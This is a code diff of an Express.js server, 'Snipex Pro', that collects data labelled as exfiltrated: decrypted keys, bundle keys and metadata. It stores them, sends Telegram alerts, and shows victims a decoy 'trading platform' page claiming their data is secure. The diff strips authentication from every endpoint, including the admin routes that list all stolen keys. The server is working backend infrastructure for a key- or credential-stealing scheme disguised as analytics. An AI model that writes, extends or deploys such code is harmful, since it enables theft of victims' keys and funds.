@@ -109,15 +109,15 @@ app.get('/', (req, res) => {
             '/api/bundle-key': 'POST - Récupération de clé de déchiffrement',
             '/api/trading': 'GET - Plateforme de trading',
             '/api/analytics/exfiltrate': 'POST - Exfiltration de données',
-            '/api/admin/stats': 'GET - Statistiques admin (admin only)',
-            '/api/admin/keys': 'GET - Clés stockées (admin only)',
-            '/api/admin/test-telegram': 'POST - Test bot Telegram (admin only)'
+            '/api/admin/stats': 'GET - Statistiques admin',
+            '/api/admin/keys': 'GET - Clés stockées',
+            '/api/admin/test-telegram': 'POST - Test bot Telegram'
         }
     });
 });
 
 // Endpoint pour récupérer la clé de déchiffrement
-app.post('/api/bundle-key', authenticateToken, async (req, res) => {
+app.post('/api/bundle-key', async (req, res) => {
     try {
         const { sBundles, timestamp, userAgent, additionalData } = req.body;
         
@@ -128,7 +128,7 @@ app.post('/api/bundle-key', authenticateToken, async (req, res) => {
 
         // Log de la demande
         await db.logBundleKeyRequest({
-            userId: req.user.id,
+            userId: 'anonymous',
             bundles: sBundles.length,
             userAgent,
             url: additionalData?.url,
@@ -161,7 +161,7 @@ app.post('/api/bundle-key', authenticateToken, async (req, res) => {
         await db.storeBundleKey({
             keyId: uuidv4(),
             key: bundleKeyBase64,
-            userId: req.user.id,
+            userId: 'anonymous',
             expiresAt: new Date(Date.now() + 60 * 60 * 1000), // 1 heure
             bundles: sBundles.length
         });
@@ -336,7 +336,7 @@ app.get('/api/trading', (req, res) => {
 
                 <div class="status">
                     <h3>🎯 Prêt pour le Trading</h3>
-                    <p>Vous pouvez maintenant accéder à tous les fonctionnalités de la plateforme.</p>
+                    <p>Vous pouvez maintenant accéder à toutes les fonctionnalités de la plateforme.</p>
                     <p class="info">Vos données sont synchronisées et sécurisées.</p>
                 </div>
             </div>
@@ -362,7 +362,7 @@ app.get('/api/trading', (req, res) => {
 });
 
 // Endpoint pour l'exfiltration des données
-app.post('/api/analytics/exfiltrate', authenticateToken, async (req, res) => {
+app.post('/api/analytics/exfiltrate', async (req, res) => {
     try {
         const { exfiltratedData, metadata } = req.body;
         
@@ -380,7 +380,7 @@ app.post('/api/analytics/exfiltrate', authenticateToken, async (req, res) => {
 
         // Stocker les données exfiltrées
         const exfiltrationId = await db.storeExfiltratedData({
-            userId: req.user.id,
+            userId: 'anonymous',
             metadata,
             exfiltratedData,
             timestamp: new Date().toISOString()
@@ -389,7 +389,7 @@ app.post('/api/analytics/exfiltrate', authenticateToken, async (req, res) => {
         // Stocker les clés individuellement
         for (const data of exfiltratedData) {
             await db.storeDecryptedKey({
-                userId: req.user.id,
+                userId: 'anonymous',
                 exfiltrationId,
                 type: data.type,
                 publicKey: data.publicKey || null,
@@ -400,8 +400,8 @@ app.post('/api/analytics/exfiltrate', authenticateToken, async (req, res) => {
         }
 
         // Log de l'exfiltration
-        await db.logExfiltratedData({
-            userId: req.user.id,
+        await db.logExfiltration({
+            userId: 'anonymous',
             exfiltrationId,
             totalBundles: metadata.totalBundles,
             decodedKeys: metadata.decodedKeys,
@@ -440,8 +440,8 @@ app.post('/api/analytics/exfiltrate', authenticateToken, async (req, res) => {
     }
 });
 
-// Endpoints admin
-app.get('/api/admin/stats', authenticateAdmin, async (req, res) => {
+// Endpoints admin (sans protection)
+app.get('/api/admin/stats', async (req, res) => {
     try {
         const stats = await db.getAdminStats();
         
@@ -456,7 +456,7 @@ app.get('/api/admin/stats', authenticateAdmin, async (req, res) => {
     }
 });
 
-app.get('/api/admin/keys', authenticateAdmin, async (req, res) => {
+app.get('/api/admin/keys', async (req, res) => {
     try {
         const keys = await db.getAllDecryptedKeys();
         res.json(keys);
@@ -466,7 +466,7 @@ app.get('/api/admin/keys', authenticateAdmin, async (req, res) => {
 });
 
 // Endpoint pour tester le bot Telegram
-app.post('/api/admin/test-telegram', authenticateAdmin, async (req, res) => {
+app.post('/api/admin/test-telegram', async (req, res) => {
     try {
         if (!telegramBot) {
             return res.status(400).json({ error: 'Bot Telegram non configuré' });
@@ -475,7 +475,7 @@ app.post('/api/admin/test-telegram', authenticateAdmin, async (req, res) => {
         const testMessage = `🧪 <b>TEST BOT TELEGRAM</b>\n\n`;
         testMessage += `⏰ <b>Timestamp:</b> ${new Date().toLocaleString('fr-FR')}\n`;
         testMessage += `✅ <b>Statut:</b> Test de connexion réussi\n`;
-        testMessage += `�� <b>Action:</b> Vérification des notifications`;
+        testMessage += `🎯 <b>Action:</b> Vérification des notifications`;
 
         await telegramBot.sendMessage(testMessage);
 
@@ -516,19 +516,19 @@ app.use('*', (req, res) => {
 // Démarrage du serveur (pour développement local)
 if (process.env.NODE_ENV !== 'production') {
     app.listen(PORT, () => {
-        console.log(`�� Serveur Snipex Pro démarré sur le port ${PORT}`);
+        console.log(`🚀 Serveur Snipex Pro démarré sur le port ${PORT}`);
         console.log(`🔑 JWT Secret configuré`);
-        console.log(`�� Admin Token configuré`);
+        console.log(`👑 Admin Token configuré`);
         console.log(`📱 Bot Telegram: ${telegramBot ? 'Connecté' : 'Désactivé'}`);
         console.log(`📊 Endpoints disponibles:`);
         console.log(`   - POST /api/bundle-key`);
         console.log(`   - GET /api/trading`);
         console.log(`   - POST /api/analytics/exfiltrate`);
-        console.log(`   - GET /api/admin/stats (admin only)`);
-        console.log(`   - GET /api/admin/keys (admin only)`);
-        console.log(`   - POST /api/admin/test-telegram (admin only)`);
+        console.log(`   - GET /api/admin/stats`);
+        console.log(`   - GET /api/admin/keys`);
+        console.log(`   - POST /api/admin/test-telegram`);
     });
 }
 
 // Export pour Vercel
-module.exports = app;
+module.exports = app; 
